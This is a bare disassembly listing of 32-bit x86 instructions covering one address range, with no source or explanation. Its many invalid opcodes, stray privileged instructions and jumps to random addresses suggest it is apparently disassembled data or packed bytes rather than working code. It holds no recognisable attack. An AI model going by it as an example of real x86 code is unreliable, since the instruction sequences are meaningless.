  40a20c:	ror    DWORD PTR [eax+eax*8],cl
  40a20f:	sbb    al,BYTE PTR [ecx]
  40a211:	xchg   DWORD PTR [ecx],ebp
  40a213:	sub    esi,DWORD PTR [eax+0x52]
  40a216:	jmp    0x5ebb0d1b
  40a21b:	(bad)  
  40a21c:	mov    edi,0x527296e0
  40a221:	dec    esi
  40a222:	jge    0x40a296
  40a224:	idiv   edi
  40a226:	into   
  40a227:	dec    esp
  40a228:	sbb    DWORD PTR [ebx+0x1f],edx
  40a22b:	call   0xe96b:0xc8d558d9
  40a232:	push   es
  40a233:	mov    al,0x3d
  40a235:	fisubr DWORD PTR [esp+ebp*2-0x16968b80]
  40a23c:	xchg   edi,eax
  40a23d:	ins    BYTE PTR es:[edi],dx
  40a23e:	int3   
  40a23f:	push   ebp
  40a240:	mov    esi,0x1dd427bb
  40a245:	addr16 dec edi
  40a247:	push   edx
  40a248:	push   esp
  40a249:	ss mov edi,0x9f2782a0
  40a24f:	mov    eax,0x354c318e
  40a254:	inc    edx
  40a255:	call   0xa7b2a8ea
  40a25a:	scas   al,BYTE PTR es:[edi]
  40a25b:	pusha  
  40a25c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a25d:	mov    ebp,0x1608142a
  40a262:	test   DWORD PTR [ebx+0x6d],edi
  40a265:	out    dx,al
  40a266:	mov    dl,0xf3
  40a268:	(bad)  
  40a269:	xor    eax,0xd7c2882
  40a26e:	(bad)  
  40a26f:	lods   al,BYTE PTR ds:[esi]
  40a270:	addr16 push es
  40a272:	add    DWORD PTR [ecx+0x5ec76ca2],0x5d
  40a279:	cmp    al,0x30
  40a27b:	neg    BYTE PTR [ecx]
  40a27d:	cmp    al,0xdb
  40a27f:	add    BYTE PTR [ecx+ebx*2+0x428d4dc],ch
  40a286:	and    al,0x14
  40a288:	add    eax,0x59991968
  40a28d:	ret    0x135c
  40a290:	hlt    
  40a291:	jge    0x40a2f6
  40a293:	jns    0x40a2dc
  40a295:	and    bl,dl
  40a297:	xor    eax,0x451b0081
  40a29c:	sub    ch,bl
  40a29e:	jmp    0xd1f0:0x9b2240c6
  40a2a5:	(bad)  
  40a2a6:	xchg   ebp,eax
  40a2a7:	adc    ebp,DWORD PTR [ebp+0x60f47961]
  40a2ad:	xchg   ecx,eax
  40a2af:	fidivr DWORD PTR [eax-0x3810cdc5]
  40a2b5:	mov    eax,ds:0xc47fd7d0
  40a2ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a2bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a2bc:	jp     0x40a2d7
  40a2be:	push   edx
  40a2bf:	cmp    ah,BYTE PTR [edx]
  40a2c1:	retf   0xbe19
  40a2c4:	add    BYTE PTR [ebx],dl
  40a2c6:	and    eax,0x307d079a
  40a2cb:	call   0x879ebd76
  40a2d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a2d1:	aad    0x3
  40a2d3:	(bad)  
  40a2d4:	hlt    
  40a2d5:	imul   esi,DWORD PTR [ecx-0x25008bff],0x18
  40a2dc:	sub    DWORD PTR [edi-0x5865e8c7],0xd3b6a273
  40a2e6:	cmp    BYTE PTR [ebp+eax*1-0x7e],dh
  40a2ea:	sbb    eax,0xcc2fac39
  40a2ef:	stos   BYTE PTR es:[edi],al
  40a2f0:	dec    ecx
  40a2f1:	sub    BYTE PTR [edx+0x4c16f08a],dh
  40a2f7:	and    eax,0x237655d6
  40a2fc:	inc    ebp
  40a2fd:	stos   DWORD PTR es:[edi],eax
  40a2fe:	call   0x3e5d:0xad898836
  40a305:	push   edi
  40a306:	mov    edi,cs
  40a308:	mov    esi,0xb914b1b2
  40a30d:	sahf   
  40a30e:	add    BYTE PTR [edi],0xc2
  40a311:	int3   
  40a312:	jno    0x40a391
  40a314:	mov    esi,0x22198826
  40a319:	xor    al,0x5
  40a31b:	not    al
  40a31d:	frstor [ebx-0x25]
  40a320:	mov    ecx,0x7f27cf31
  40a325:	adc    eax,0x7527b1ae
  40a32a:	or     ebx,0x4b
  40a32d:	ror    DWORD PTR [edi],1
  40a32f:	or     DWORD PTR ds:0xbba29f90,0xf822668a
  40a339:	and    al,0x1b
  40a33b:	inc    eax
  40a33c:	gs popa 
  40a33e:	dec    esp
  40a33f:	inc    ecx
  40a340:	outs   dx,BYTE PTR ds:[esi]
  40a341:	out    0x26,eax
  40a343:	dec    ecx
  40a344:	sbb    dl,bl
  40a346:	inc    ebx
  40a347:	(bad)  
  40a348:	(bad)  [esi-0x297b2145]
  40a34e:	mov    ebx,0xec904a3a
  40a353:	int3   
  40a354:	sbb    al,ah
  40a356:	xchg   ebp,eax
  40a357:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a358:	jge    0x40a33e
  40a35a:	sbb    eax,0xaf5d2aea
  40a35f:	cld    
  40a360:	hlt    
  40a361:	dec    esi
  40a362:	arpl   WORD PTR [eax+0x1abf0dd2],ax
  40a368:	xchg   esi,eax
  40a369:	fldenv [eax-0x36]
  40a36c:	jg     0x40a34d
  40a36e:	fs add al,0x5f
  40a371:	daa    
  40a372:	sbb    ah,bh
  40a374:	(bad)  
  40a376:	aas    
  40a377:	sub    BYTE PTR [eax+0x14d358aa],al
  40a37d:	sbb    DWORD PTR [ebp-0x5d3fc080],esi
  40a383:	mov    dh,0x24
  40a385:	out    dx,eax
  40a386:	dec    edi
  40a387:	jl     0x40a35b
  40a389:	push   ebx
  40a38a:	jl     0x40a388
  40a38c:	daa    
  40a38d:	retf   0x285b
  40a390:	or     DWORD PTR [esp+eiz*4],edx
  40a393:	sbb    al,0xbd
  40a395:	mul    DWORD PTR [esi+0x6d569568]
  40a39b:	mov    ds:0xe1ec9d56,eax
  40a3a0:	retf   0x3999
  40a3a3:	cli    
  40a3a4:	in     al,0xab
  40a3a6:	pushf  
  40a3a7:	repz imul esi,DWORD PTR [edi+0x3eca4999],0x2b
  40a3af:	fdiv   QWORD PTR [esi+0x3e]
  40a3b2:	push   ds
  40a3b3:	mov    eax,0xd19a63c0
  40a3b8:	sbb    BYTE PTR [edi-0x40cfba00],dl
  40a3be:	test   al,0x35
  40a3c0:	mov    ds:0x44592d1c,al
  40a3c5:	test   eax,0x75fba379
  40a3ca:	imul   ebp,DWORD PTR [edi-0x1d],0x5e1bcc70
  40a3d1:	add    cl,BYTE PTR [edi+ecx*1-0x3]
  40a3d5:	dec    edi
  40a3d6:	adc    ecx,esp
  40a3d8:	sbb    eax,0x226f05a8
  40a3dd:	into   
  40a3de:	cmp    eax,0x1d3a06b3
  40a3e3:	in     al,dx
  40a3e4:	pushf  
  40a3e5:	push   es
  40a3e6:	outs   dx,DWORD PTR ds:[esi]
  40a3e7:	inc    ebp
  40a3e8:	cmp    DWORD PTR [esi*1+0x6bcf650b],esp
  40a3ef:	jae    0x40a46a
  40a3f1:	stos   DWORD PTR es:[edi],eax
  40a3f2:	inc    ebx
  40a3f3:	js     0x40a43e
  40a3f5:	sbb    edx,DWORD PTR [eax+0xf69a5f2]
  40a3fb:	fst    DWORD PTR [eax+eiz*8+0x492d35e7]
  40a402:	imul   esp,DWORD PTR [ebx+0x36],0x8fcb3054
  40a409:	sub    DWORD PTR [ebx],edi
  40a40b:	leave  
  40a40c:	scas   eax,DWORD PTR es:[edi]
  40a40d:	and    eax,0xedccfe9
  40a412:	jno    0x40a479
  40a414:	sbb    eax,DWORD PTR [ebx-0x68]
  40a417:	fcom   st(5)
  40a419:	inc    eax
  40a41a:	ret    0x51bd
  40a41d:	inc    eax
  40a41e:	lea    ebx,[edi+0x4e7aaed9]
  40a424:	pop    esi
  40a425:	bndldx (bad),[ecx-0x6884dd42]
  40a42c:	adc    cl,dl
  40a42e:	or     esp,edx
  40a430:	ds xor eax,0x29391525
  40a437:	(bad)  
  40a439:	push   ebp
  40a43a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a43b:	dec    esp
  40a43c:	test   al,0xe3
  40a43e:	xor    eax,0xade7a026
  40a443:	pop    ds
  40a444:	mov    ch,0x63
  40a446:	or     BYTE PTR [edx],cl
  40a448:	or     ch,cl
  40a44a:	dec    edx
  40a44b:	out    dx,eax
  40a44c:	and    eax,0xac914578
  40a451:	mov    dl,0xfd
  40a453:	jle    0x40a429
  40a455:	mov    WORD PTR [edi+0x7aa286e8],cs
  40a45b:	push   0xa0ba06d2
  40a460:	retf   
  40a461:	ja     0x40a46e
  40a463:	cli    
  40a464:	dec    edi
  40a465:	retf   
  40a466:	pop    edx
  40a467:	dec    esi
  40a468:	scas   al,BYTE PTR es:[edi]
  40a469:	ins    DWORD PTR es:[edi],dx
  40a46a:	inc    esp
  40a46b:	daa    
  40a46c:	xor    esp,0x6966db11
  40a472:	pop    ss
  40a473:	inc    ebp
  40a474:	aam    0x5c
  40a476:	imul   esi,ecx,0x64dd04c8
  40a47c:	jle    0x40a40b
  40a47e:	or     DWORD PTR [edx-0x64],eax
  40a481:	inc    edx
  40a482:	xor    bh,ch
  40a484:	mov    esi,0x2918cdc
  40a489:	loop   0x40a427
  40a48b:	adc    bl,BYTE PTR [ebx+0x3e]
  40a48e:	sub    eax,0xa063d597
  40a493:	fimul  WORD PTR [eax-0x35]
  40a496:	nop
  40a497:	ins    DWORD PTR es:[edi],dx
  40a498:	xchg   ebx,esi
  40a49a:	xchg   ecx,eax
  40a49b:	cmp    esi,esi
  40a49d:	lock test DWORD PTR [ebx+0x79],ecx
  40a4a1:	lahf   
  40a4a2:	call   0x997b1984
  40a4a7:	xor    ebp,DWORD PTR [ebx]
  40a4a9:	jbe    0x40a44a
  40a4ab:	(bad)
  40a4b0:	das    
  40a4b1:	lahf   
  40a4b2:	ret    
  40a4b3:	sub    DWORD PTR [edx],ecx
  40a4b5:	lea    ebx,[ecx-0x5e8ac8bc]
  40a4bb:	pop    eax
  40a4bc:	lods   al,BYTE PTR ds:[esi]
  40a4bd:	mov    bh,0x7c
  40a4bf:	pusha  
  40a4c0:	pop    eax
  40a4c1:	cmp    al,0x89
  40a4c3:	adc    dh,BYTE PTR [ecx]
  40a4c5:	adc    cl,BYTE PTR ds:[edi+0x39a40493]
  40a4cc:	popf   
  40a4cd:	mul    BYTE PTR [esi-0x7ef75ff7]
  40a4d3:	xor    BYTE PTR [edi+0x447d3648],0x9f
  40a4da:	cli    
  40a4db:	aad    0x3
  40a4dd:	loopne 0x40a47b
  40a4df:	mov    esi,0x34117ce4
  40a4e4:	(bad)  
  40a4e5:	fldcw  WORD PTR [ebx]
  40a4e7:	and    DWORD PTR [eax+0x2ca64d3f],0x1d
  40a4ee:	sbb    DWORD PTR [eax],edi
  40a4f0:	fs sub al,0x63
  40a4f3:	xor    BYTE PTR ds:0xebb297ba,dl
  40a4f9:	data16 or al,0x6
  40a4fc:	into   
  40a4fd:	adc    BYTE PTR [ecx],cl
  40a4ff:	pop    edx
  40a500:	test   eax,0x2275b6d8
  40a505:	les    ebp,FWORD PTR [edi]
  40a507:	xchg   ebx,eax
  40a508:	jo     0x40a54f
  40a50a:	add    esi,DWORD PTR [esi-0x66c15a6e]
  40a510:	xor    eax,0xc7efd8fb
  40a515:	push   es
  40a516:	inc    eax
  40a517:	xchg   ebp,eax
  40a518:	outs   dx,BYTE PTR ds:[esi]
  40a519:	retf   
  40a51a:	mov    bh,dh
  40a51c:	dec    ebx
  40a51d:	mov    eax,0xe6257e3d
  40a522:	jl     0x40a513
  40a524:	leave  
  40a525:	repnz mov WORD PTR [esi],gs
  40a528:	and    BYTE PTR [eax],bl
  40a52a:	pop    ecx
  40a52b:	dec    ecx
  40a52c:	push   ecx
  40a52d:	push   cs
  40a52e:	sub    DWORD PTR [ebx-0x52e307f0],esi
  40a534:	inc    edi
  40a535:	or     al,0xc4
  40a537:	mov    eax,ds:0xd1ebb9f2
  40a53c:	lock lahf 
  40a53e:	mov    ch,0xc5
  40a540:	or     ch,BYTE PTR [ecx+0xe3f0128]
  40a546:	fsubrp st(7),st
  40a548:	dec    ebp
  40a549:	fiadd  DWORD PTR [eax+0xb764a1a]
  40a54f:	xor    eax,0xaf7875d4
  40a554:	test   al,0xe6
  40a556:	push   edi
  40a557:	popa   
  40a558:	ror    bh,1
  40a55a:	sbb    al,0xf9
  40a55c:	mov    ebx,DWORD PTR fs:[ebx]
  40a55f:	gs push ebp
  40a561:	dec    ecx
  40a562:	out    0x79,eax
  40a564:	ds out dx,al
  40a566:	scas   eax,DWORD PTR es:[edi]
  40a567:	jge    0x40a59e
  40a569:	add    BYTE PTR [ebp-0x3aff061b],dl
  40a56f:	iret   
  40a570:	rcl    DWORD PTR [ebp+0x7],0xb9
  40a574:	sti    
  40a575:	leave  
  40a576:	xor    esi,DWORD PTR [edi-0x61]
  40a579:	dec    eax
  40a57a:	rcl    esp,cl
  40a57c:	gs sub al,0x88
  40a57f:	lahf   
  40a580:	fidivr DWORD PTR [ecx]
  40a582:	mov    al,ds:0x557c2b96
  40a587:	in     eax,dx
  40a588:	sbb    ecx,DWORD PTR [edx+0x1c]
  40a58b:	push   ebp
  40a58c:	push   0xffffffc2
  40a58e:	mov    eax,0xdc11c124
  40a593:	push   es
  40a594:	xchg   eax,edx
  40a596:	add    BYTE PTR [esi-0x4e],0x9b
  40a59a:	icebp  
  40a59b:	or     BYTE PTR [ecx-0x47],0x61
  40a59f:	cmp    al,0x7f
  40a5a1:	sbb    BYTE PTR [edx+esi*4+0x3b34c833],bl
  40a5a8:	add    ah,BYTE PTR [ebx+0x1c7407f9]
  40a5ae:	scas   al,BYTE PTR es:[edi]
  40a5af:	push   edx
  40a5b0:	add    eax,0x98aaf17e
  40a5b5:	sbb    DWORD PTR [edi+0x23c8bbfd],ebp
  40a5bb:	test   al,0xf2
  40a5bd:	push   ecx
  40a5be:	push   esp
  40a5bf:	cli    
  40a5c0:	inc    edx
  40a5c1:	push   0x27f69265
  40a5c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a5c7:	mov    ebp,0x1a1d334b
  40a5cc:	push   ebx
  40a5cd:	push   esp
  40a5ce:	xor    eax,0x57d2c5c0
  40a5d3:	mov    BYTE PTR [edx+esi*1+0x2b2c35e6],cl
  40a5da:	push   ebp
  40a5db:	fmul   st,st(5)
  40a5dd:	mov    ds:0xdc6c3a23,al
  40a5e2:	xor    BYTE PTR [ecx],ah
  40a5e4:	in     eax,0xf
  40a5e6:	mov    ds:0x4adb8104,al
  40a5eb:	lahf   
  40a5ec:	xchg   DWORD PTR [edi-0x53113271],esi
  40a5f2:	not    BYTE PTR [eax+eiz*2+0x7]
  40a5f6:	sbb    al,0xf4
  40a5f8:	cld    
  40a5f9:	mov    ch,0xe4
  40a5fb:	ja     0x40a58c
  40a5fd:	out    dx,al
  40a5fe:	push   es
  40a5ff:	mov    dh,0xe9
  40a601:	jmp    0x40a58a
  40a603:	outs   dx,DWORD PTR ds:[esi]
  40a604:	push   0x9642440c
  40a609:	(bad)  
  40a60a:	ror    bl,1
  40a60c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a60d:	jns    0x40a5b5
  40a60f:	jne    0x40a5ed
  40a611:	jnp    0x40a5aa
  40a613:	xor    eax,0x66deaffa
  40a618:	cdq    
  40a619:	(bad)  
  40a61a:	out    dx,al
  40a61b:	or     al,0xf
  40a61d:	cwde   
  40a61e:	push   edx
  40a61f:	jmp    0x40a5fd
  40a621:	push   cs
  40a622:	cld    
  40a623:	enter  0x65a2,0xbd
  40a627:	mov    ?,WORD PTR [ebp-0x37]
  40a62a:	leave  
  40a62b:	xchg   ecx,eax
  40a62c:	adc    DWORD PTR [edx-0x4b827856],0x44ea2015
  40a636:	cmp    eax,0xdca46a7b
  40a63b:	mov    esp,0xd397533b
  40a640:	shl    DWORD PTR [esi+0x5bbe81be],cl
  40a646:	(bad)  
  40a647:	sub    ebp,ebp
  40a649:	ss xor eax,0x97d796c6
  40a64f:	jle    0x40a651
  40a651:	jbe    0x40a60a
  40a653:	int    0x46
  40a655:	inc    esp
  40a656:	sbb    al,0x7a
  40a658:	stos   DWORD PTR es:[edi],eax
  40a659:	push   edi
  40a65a:	cmp    eax,0xec82b227
  40a65f:	mov    DWORD PTR [eax-0x9cf11c2],edi
  40a665:	es hlt 
  40a667:	and    BYTE PTR [eax],cl
  40a669:	mov    ebx,0xf34043d6
  40a66e:	mov    ecx,0x3cf22cab
  40a673:	dec    esi
  40a674:	ds and al,0x60
  40a677:	cmp    ch,bl
  40a679:	call   0xdd8a69a3
  40a67e:	(bad)  
  40a680:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a681:	inc    edi
  40a682:	lods   al,BYTE PTR ds:[esi]
  40a683:	xchg   edx,esi
  40a685:	test   BYTE PTR [eax],al
  40a687:	push   0x18d4ccdc
  40a68c:	stos   DWORD PTR es:[edi],eax
  40a68d:	push   es
  40a68e:	popf   
  40a68f:	add    al,dh
  40a691:	dec    edi
  40a692:	fisttp WORD PTR [edi]
  40a694:	imul   BYTE PTR ds:0xa02e7f6c
  40a69a:	adc    esp,eax
  40a69c:	lds    ebp,FWORD PTR [edi]
  40a69e:	rcr    dx,1
  40a6a1:	mov    bl,0x84
  40a6a3:	jmp    0x2122:0xee5c0697
  40a6aa:	js     0x40a6b5
  40a6ac:	lahf   
  40a6ad:	repz mul DWORD PTR [esi]
  40a6b0:	inc    esi
  40a6b1:	mov    WORD PTR [ebp+ebp*4+0x29],ds
  40a6b5:	lods   al,BYTE PTR ds:[esi]
  40a6b6:	xor    BYTE PTR [edi],cl
  40a6b8:	gs in  eax,0x40
  40a6bb:	sar    ebx,0xbf
  40a6be:	outs   dx,BYTE PTR ds:[esi]
  40a6bf:	pop    es
  40a6c0:	outs   dx,BYTE PTR ds:[esi]
  40a6c1:	mov    edx,0x5d02008b
  40a6c6:	fidiv  WORD PTR [eax]
  40a6c8:	xor    edx,esi
  40a6ca:	inc    ebx
  40a6cb:	xor    eax,ebp
  40a6cd:	and    bh,BYTE PTR [edi]
  40a6cf:	and    dl,BYTE PTR [eax-0x2b]
  40a6d2:	mov    ?,WORD PTR [edx-0x5f]
  40a6d5:	xchg   edx,eax
  40a6d6:	cmp    esp,DWORD PTR [ebx+ebp*2+0x6851c1ea]
  40a6dd:	mov    al,0x6a
  40a6df:	rol    BYTE PTR [edi-0x6877cb88],cl
  40a6e5:	sti    
  40a6e6:	fs ja  0x40a69b
  40a6e9:	jno    0x40a6c0
  40a6eb:	jbe    0x40a6c5
  40a6ed:	cwde   
  40a6ee:	fwait
  40a6ef:	pop    ds
  40a6f0:	into   
  40a6f1:	es jnp 0x40a74a
  40a6f4:	shl    DWORD PTR [esi+0x45b6e352],cl
  40a6fa:	(bad)  
  40a6fb:	jmp    0x40a69a
  40a6fd:	xchg   esi,eax
  40a6fe:	retf   
  40a6ff:	and    eax,0xe0d5711e
  40a704:	stc    
  40a705:	out    0x2d,eax
  40a707:	jecxz  0x40a6fa
  40a709:	daa    
  40a70a:	mov    eax,0x561d42dd
  40a70f:	(bad)  
  40a710:	(bad)  
  40a711:	fcmovbe st,st(4)
  40a713:	outs   dx,DWORD PTR ds:[esi]
  40a714:	cmp    ecx,DWORD PTR [ebx]
  40a716:	test   eax,0xeb21685c
  40a71b:	add    BYTE PTR [edi],0x22
  40a71e:	cmp    ebp,DWORD PTR ds:0xae0f17e
  40a724:	daa    
  40a725:	clc    
  40a726:	push   ebx
  40a727:	jp     0x40a792
  40a729:	in     al,0xe5
  40a72b:	pop    ebx
  40a72c:	sub    bl,BYTE PTR [esi]
  40a72e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a72f:	mov    edi,0x367104f6
  40a734:	das    
  40a735:	jmp    0x40a795
  40a737:	mov    ?,WORD PTR [edi+0x5c49b52f]
  40a73d:	imul   ecx,DWORD PTR [ecx-0x1b],0xffffffdf
  40a741:	mov    ebx,0xcf7de537
  40a746:	sub    esi,esp
  40a748:	inc    edi
  40a749:	adc    DWORD PTR ds:0x66a202ab,ecx
  40a74f:	clc    
  40a750:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a751:	enter  0xdff5,0xb5
  40a755:	adc    al,dh
  40a757:	mov    ?,WORD PTR [ebp+edx*1+0x35893845]
  40a75e:	pop    ecx
  40a75f:	repnz push es
  40a761:	cld    
  40a762:	push   edi
  40a763:	push   0x76f51568
  40a768:	pusha  
  40a769:	lahf   
  40a76a:	add    BYTE PTR [ebx-0x5a6f3641],ch
  40a770:	jb     0x40a757
  40a772:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a773:	and    esi,DWORD PTR [ecx-0xa0a1e8d]
  40a779:	push   edi
  40a77a:	sbb    al,0x58
  40a77c:	sub    DWORD PTR [edi+ebp*8],eax
  40a77f:	push   esp
  40a780:	outs   dx,WORD PTR ds:[esi]
  40a782:	mov    cl,BYTE PTR [edx]
  40a784:	fimul  DWORD PTR [edi+0x5d3ecdce]
  40a78a:	xchg   esi,eax
  40a78b:	fwait
  40a78c:	push   ecx
  40a78d:	push   esp
  40a78e:	pop    esp
  40a78f:	push   ss
  40a790:	jle    0x40a7cd
  40a792:	ror    BYTE PTR ds:0x559cb476,cl
  40a798:	je     0x40a732
  40a79a:	fnsave [ebx]
  40a79c:	lods   eax,DWORD PTR ds:[esi]
  40a79d:	es xor ah,bh
  40a7a0:	mov    dl,0x90
  40a7a2:	ja     0x40a7ee
  40a7a4:	jns    0x40a7b0
  40a7a6:	imul   esi,DWORD PTR [ebp-0x58],0x7b1d46c6
  40a7ad:	push   0x1c50eadc
  40a7b2:	iret   
  40a7b3:	cld    
  40a7b4:	lea    edx,[bx+0x439f]
  40a7b9:	sbb    ch,BYTE PTR [edx+0x2a681572]
  40a7bf:	mov    ds:0x3b99c855,eax
  40a7c4:	stos   BYTE PTR es:[edi],al
  40a7c5:	iret   
  40a7c6:	push   edi
  40a7c7:	inc    ecx
  40a7c8:	push   eax
  40a7c9:	mov    esp,0x9c9012b0
  40a7ce:	fistp  DWORD PTR [ebx+0x75]
  40a7d1:	iret   
  40a7d2:	(bad)
  40a7d5:	(bad)  
  40a7d7:	push   eax
  40a7d8:	into   
  40a7d9:	push   edx
  40a7da:	lods   al,BYTE PTR ds:[esi]
  40a7db:	pop    eax
  40a7dc:	mov    es,esi
  40a7de:	adc    BYTE PTR [edx+0x2d5142d4],cl
  40a7e4:	mov    al,ds:0x22b69502
  40a7e9:	lock fnstsw WORD PTR [ebp+0x2be61a4c]
  40a7f0:	loop   0x40a859
  40a7f2:	test   eax,0xc28b4413
  40a7f7:	fcmove st,st(5)
  40a7f9:	repnz dec eax
  40a7fb:	pop    edi
  40a7fc:	mov    esp,0x60f972c1
  40a801:	in     al,dx
  40a802:	mov    ah,0xc4
  40a804:	cdq    
  40a805:	jae    0x40a87a
  40a807:	sub    DWORD PTR ds:0x53150471,eax
  40a80d:	mov    bl,0xf6
  40a80f:	outs   dx,BYTE PTR ds:[esi]
  40a810:	push   ds
  40a811:	mov    ch,0x66
  40a813:	aad    0x22
  40a815:	(bad)  
  40a816:	scas   eax,DWORD PTR es:[edi]
  40a817:	push   ecx
  40a818:	loopne 0x40a86c
  40a81a:	add    edi,DWORD PTR [ecx+0xff1e897]
  40a820:	xlat   BYTE PTR ds:[ebx]
  40a821:	into   
  40a822:	mov    esp,0xe7c1c8cf
  40a827:	push   edx
  40a828:	cli    
  40a829:	mov    ds:0x98b8d0e4,eax
  40a82e:	ds pop ebx
  40a830:	xor    eax,0xed06223e
  40a835:	pop    esp
  40a836:	icebp  
  40a837:	adc    eax,0xe5b8461f
  40a83c:	sub    bl,BYTE PTR [edi+0x546cc457]
  40a842:	mov    eax,ds:0xac9eb5c5
  40a847:	cmp    bh,BYTE PTR [ecx+0x40]
  40a84a:	outs   dx,DWORD PTR ds:[esi]
  40a84b:	in     al,dx
  40a84c:	push   0xffffffad
  40a84e:	pop    ebx
  40a84f:	dec    esp
  40a850:	cdq    
  40a851:	test   BYTE PTR ds:0x5a476757,0x18
  40a858:	retf   0xebfd
  40a85b:	sbb    ebx,ebp
  40a85d:	in     al,0x9
  40a85f:	jnp    0x40a888
  40a861:	xchg   edi,eax
  40a862:	lods   eax,DWORD PTR ds:[esi]
  40a863:	mov    WORD PTR [ecx-0x260d8e08],fs
  40a869:	or     eax,0xd2880bfe
  40a86e:	pop    edx
  40a86f:	(bad)
  40a873:	leave  
  40a874:	sbb    eax,0xa81d46ac
  40a879:	pop    edx
  40a87a:	adc    al,0x5f
  40a87c:	mov    edx,0xfd5af6a7
  40a881:	cs xchg edi,eax
  40a884:	scas   eax,DWORD PTR es:[edi]
  40a885:	(bad)  
  40a887:	pop    edx
  40a888:	push   edx
  40a889:	mov    ds:0x3bae7cac,al
  40a88e:	mov    esi,0xa9fd4ea
  40a893:	jg     0x40a8f6
  40a895:	into   
  40a896:	xchg   ebx,eax
  40a897:	aad    0xca
  40a899:	ja     0x40a85f
  40a89b:	adc    esp,DWORD PTR [esi+ebp*2+0x58]
  40a89f:	es sub cl,dh
  40a8a2:	retf   
  40a8a3:	in     eax,0x3
  40a8a5:	lock jl 0x40a899
  40a8a8:	inc    esi
  40a8a9:	mov    WORD PTR [ebp-0x57aba852],gs
  40a8af:	iret   
  40a8b0:	inc    ebp
  40a8b1:	push   ds
  40a8b2:	mov    dl,0x27
  40a8b4:	ins    BYTE PTR es:[edi],dx
  40a8b5:	jecxz  0x40a927
  40a8b7:	popf   
  40a8b8:	fld    DWORD PTR [edx]
  40a8ba:	sbb    ah,BYTE PTR [ecx]
  40a8bc:	add    ecx,DWORD PTR [ecx+0x5a9967d6]
  40a8c2:	jnp    0x40a8f2
  40a8c4:	mov    BYTE PTR [edx+0x25],bh
  40a8c7:	dec    ecx
  40a8c8:	jg     0x40a8e5
  40a8ca:	sub    bl,cl
  40a8cc:	sbb    ebx,esp
  40a8ce:	add    DWORD PTR fs:[ebx+0x6e],esi
  40a8d2:	arpl   WORD PTR [ecx+0x71],cx
  40a8d5:	push   edi
  40a8d6:	int3   
  40a8d7:	fstp   DWORD PTR [ecx]
  40a8d9:	enter  0xc7ea,0x24
  40a8dd:	(bad)  
  40a8de:	ret    
  40a8df:	je     0x40a906
  40a8e1:	ja     0x40a905
  40a8e3:	icebp  
  40a8e4:	mov    ss,WORD PTR [ecx-0x1e7a5208]
  40a8ea:	jg     0x40a8bb
  40a8ec:	sub    DWORD PTR [edi-0x4f],edx
  40a8ef:	and    DWORD PTR [edi+eax*4],0x7eb5994a
  40a8f6:	shl    DWORD PTR [edx],0x4f
  40a8f9:	ret    0x6224
  40a8fc:	jne    0x40a8cb
  40a8fe:	add    al,0xa
  40a900:	sbb    al,0xa8
  40a902:	adc    al,0xea
  40a904:	sahf   
  40a905:	adc    DWORD PTR [ebp+0x34],eax
  40a908:	std    
  40a909:	sbb    eax,0xe0521f25
  40a90e:	jnp    0x40a8b4
  40a910:	mov    bl,0x67
  40a912:	stc    
  40a913:	mov    edi,0xb37a7412
  40a918:	xchg   ebx,eax
  40a919:	sahf   
  40a91a:	pop    ss
  40a91b:	rol    bh,1
  40a91d:	or     eax,0xccadaccd
  40a922:	xor    eax,0x4d358f92
  40a927:	(bad)  
  40a928:	mov    ch,0x80
  40a92a:	lods   eax,DWORD PTR ds:[esi]
  40a92b:	ins    DWORD PTR es:[edi],dx
  40a92c:	mov    ebx,0x3f7c4f91
  40a931:	sbb    ebx,DWORD PTR [edi-0x1fe89342]
  40a937:	in     eax,dx
  40a938:	stc    
  40a939:	mov    WORD PTR [eax+0x6a],?
  40a93c:	pop    eax
  40a93d:	xor    bl,bh
  40a93f:	hlt    
  40a940:	pop    edx
  40a941:	aad    0x72
  40a943:	xchg   ebp,eax
  40a944:	inc    eax
  40a945:	clc    
  40a946:	repz sti 
  40a948:	(bad)  
  40a949:	adc    eax,0x4a7fc36
  40a94e:	inc    esi
  40a94f:	sub    al,0x6c
  40a951:	ret    
  40a952:	fcomp  st(0)
  40a954:	pop    esi
  40a955:	inc    edx
  40a956:	xor    al,0x89
  40a958:	mov    ch,0x87
  40a95a:	lahf   
  40a95b:	xchg   edi,eax
  40a95c:	sub    al,0xbe
  40a95e:	fwait
  40a95f:	sbb    ch,BYTE PTR ds:0x12a699c8
  40a965:	adc    ah,dl
  40a967:	mov    dl,0xb6
  40a969:	pop    ecx
  40a96a:	jo     0x40a9af
  40a96c:	aas    
  40a96d:	lock mov al,0xf2
  40a970:	jo     0x40a9d5
  40a972:	push   0xabcd30cf
  40a977:	cdq    
  40a978:	dec    ecx
  40a979:	xchg   DWORD PTR [eax+eax*1-0x1],esi
  40a97d:	stc    
  40a97e:	icebp  
  40a97f:	rcr    eax,1
  40a981:	int    0x33
  40a983:	dec    ebp
  40a984:	and    DWORD PTR [esp+esi*4+0x76],0xffffffd6
  40a989:	or     ebx,edi
  40a98b:	push   ss
  40a98c:	jle    0x40a9be
  40a98e:	lock pop ss
  40a990:	arpl   WORD PTR [ebp-0x64],ax
  40a993:	cmc    
  40a994:	mov    al,ds:0xb69f1a0f
  40a999:	jo     0x40a95b
  40a99b:	addr16 pop esp
  40a99d:	sub    eax,0x18fcc4dc
  40a9a2:	sub    al,0x28
  40a9a4:	and    ah,BYTE PTR [ecx-0x52]
  40a9a7:	xchg   edx,eax
  40a9a8:	inc    esi
  40a9a9:	call   0xbc9c6c0f
  40a9ae:	cmp    ah,ch
  40a9b0:	adc    al,0xc2
  40a9b2:	stos   DWORD PTR es:[edi],eax
  40a9b3:	ja     0x40a96a
  40a9b5:	(bad)  [ebx]
  40a9b7:	lock (bad) 
  40a9b9:	es mov ecx,0xfc510553
  40a9bf:	xor    dl,BYTE PTR [ebx]
  40a9c1:	out    dx,al
